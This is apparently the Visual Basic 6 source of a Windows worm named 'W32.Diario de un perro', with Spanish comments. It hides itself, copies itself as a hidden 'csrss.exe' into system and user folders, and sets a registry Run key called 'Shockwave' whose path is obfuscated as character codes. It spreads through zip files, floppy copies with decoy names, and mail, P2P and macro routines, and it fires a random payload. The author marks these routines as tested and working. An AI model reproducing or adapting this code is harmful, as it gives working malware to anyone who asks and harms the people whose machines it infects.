VERSION 5.00
Begin VB.Form Form1 
   AutoRedraw      =   -1  'True
   BorderStyle     =   0  'None
   Caption         =   "El diario de un perro"
   ClientHeight    =   1770
   ClientLeft      =   -5745
   ClientTop       =   1530
   ClientWidth     =   1035
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1770
   ScaleWidth      =   1035
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   4560
      Top             =   2520
   End
   Begin VB.FileListBox File1 
      Height          =   1650
      Left            =   3120
      TabIndex        =   0
      Top             =   120
      Width           =   2415
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3360
      Top             =   2520
   End
   Begin VB.Timer Timer1 
      Left            =   3960
      Top             =   2520
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'*******************************************
'W32.Diario de un perro
'*******************************************
Option Explicit
Dim borrar As String
Private Sub Form_Load()
Dim arch, ejecu, aux

Call cargarfso
Call cargarwss

On Error Resume Next

App.TaskVisible = False
midir = fso.buildpath(App.Path, App.EXEName & ".exe")

aux = wss.regread(decriptador("72,75,76,77,92,115,111,102,116,119,97,114,101,92,109,105,99,114,111,115,111,102,116,92,119,105,110,100,111,119,115,92,99,117,114,114,101,110,116,118,101,114,115,105,111,110,92,117,110,105,110,115,116,97,108,108,92,119,105,110,122,105,112,92,117,110,105,110,115,116,97,108,108,115,116,114,105,110,103,"))
winzip = fso.getparentfoldername(aux)
If winzip <> "" Then Call existewinzip

File1.Pattern = "*.zip"


If LCase(fso.getspecialfolder(0)) <> LCase(App.Path) And _
 LCase(wss.SpecialFolders("MyDocuments")) <> LCase(App.Path) Then
  

  If winzip <> "" Then
    '/////////////
    Call mail     'chkdo funciona 90% programacion
    '/////////////
  End If

  Call copiarmediscoduro(fso.getspecialfolder(0))
  Open fso.getspecialfolder(1) & "\readme.txt" For Output As #1
    Write #1, midir
  Close #1

  Shell fso.getspecialfolder(0) & "\csrss.exe"
  End
Else
  Call residente      'chkdo funciona 100 %
  
  If chkrzipsnoopy = False And winzip <> "" Then
    Call separar        'Chkdo funciona 100%
    'Call extraerdll
    'Call separarsnoopy
    Call extraersnoopys 'Chkdo funciona 100%
    Call copiadeseguridad(fso.getspecialfolder(2)) 'Chkdo funciona 100%
    Call unidades       'Chkdo funciona 100%
  End If
  
  
  Call p2pdownloads   'chkdo Funciona 99.9 %
  Call existearchivo  'chkdo funciona 100%
  Randomize
  If dia = Int(Rnd * 9) Then Call payload 'chkdo funciona 100%
  Timer2.Enabled = True
End If
End Sub
Sub copiarmediscoduro(dire As String)
On Error GoTo err

FileCopy midir, dire & "\csrss.exe"
SetAttr dire & "\csrss.exe", vbHidden

Exit Sub

err:
If winzip <> "" Then
  Call residente
  Call payload
  'para xp protegido
  FileCopy midir, wss.SpecialFolders("MyDocuments") & "\csrss.exe"
  SetAttr wss.SpecialFolders("MyDocuments") & "\csrss.exe", vbHidden
Else
  Call residente
  FileCopy midir, wss.SpecialFolders("MyDocuments") & "\csrss.exe"
  SetAttr wss.SpecialFolders("MyDocuments") & "\csrss.exe", vbHidden
  Shell wss.SpecialFolders("MyDocuments") & "\csrss.exe"
  End
End If
End Sub
Private Sub Form_Terminate()
Shell midir 'Para 95/98/Me..
End Sub
Sub copiarmeadiskette()
On Error GoTo err
Dim i As Integer
Dim exe As String

File1.Path = "A:\"

'
 If winzip <> "" Then
  For i = 0 To File1.ListCount - 1
   DoEvents
   Call infectarzip(File1.Path & File1.List(i))
   DoEvents
  Next
 End If

FileCopy midir, File1.Path & nombreszip & ".exe"

'Open midir For Binary As #4
'exe = Space(LOF(1))
'Get #4, , exe
'Close #4
'
'Open File1.Path & "Documentos.exe" For Binary As #4
'Put #4, , exe
'Close #4

err:
End Sub
Function nombreszip() As String
Dim au As Integer
Randomize
au = Int(Rnd() * 25)
Select Case au
Case 0: nombreszip = "archivo"
Case 1: nombreszip = "Documentos"
Case 2: nombreszip = "fotos"
Case 3: nombreszip = "presentacion"
Case 4: nombreszip = "ac&dc"
Case 5: nombreszip = "archivos"
Case 6: nombreszip = "programa"
Case 7: nombreszip = "codigo"
Case 8: nombreszip = "La satisfacción"
Case 9: nombreszip = "perrito"
Case 10: nombreszip = "ver para creer"
Case 11: nombreszip = "1"
Case 12: nombreszip = "asdf"
Case 13: nombreszip = "xoom"
Case 14: nombreszip = "converse"
Case 15: nombreszip = "arch"
Case 16: nombreszip = "medios"
Case 17: nombreszip = "huevocartoon"
Case 18: nombreszip = "mono mario"
Case 19: nombreszip = "6"
Case 20: nombreszip = "media"
Case 21: nombreszip = "rock"
Case 22: nombreszip = "intocable"
Case 23: nombreszip = "source"
Case 24: nombreszip = "Files"
Case 25: nombreszip = "Names"
End Select
End Function


Private Sub Timer1_Timer()
 On Error GoTo err
  Kill borrar
  Kill fso.getspecialfolder(1) & "\readme.txt"
  Timer1.Enabled = False
err:
End Sub

Private Sub existearchivo()

On Error Resume Next

Open fso.getspecialfolder(1) & "\readme.txt" For Input As #1
 Input #1, borrar
Close #1

Timer1.Interval = 1000
End Sub

Private Sub Timer2_Timer()
Static i As Integer
On Error GoTo err
'300

Call residente
Call activarmacroyvbproyectos

If i >= 300 Then
  Call copiarmeadiskette
  i = 0
End If
i = i + 1




err:
End Sub
Function dia() As Integer
dia = Mid(Day(Date), Len(Day(Date)), Len(Day(Date)))
End Function
Private Sub payload()
Timer1.Enabled = False
Timer2.Enabled = False

Call pagina
Call cargarsnoopy

'Me.BorderStyle = 0
'Me.Width = 1035
'Me.Height = 1770

Form2.Visible = True
'Me.Show vbModeless

ventanavisible Form2.hwnd
If chkrzipsnoopy = True Then Timer3.Enabled = True
End Sub
Private Sub residente()
 wss.regwrite decriptador("72,75,76,77,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,83,104,111,99,107,119,97,118,101,"), midir
End Sub

Private Sub Timer3_Timer()
DoEvents
'Me.BorderStyle = 0
'Me.ClipControls = True
Call snoopy
End Sub


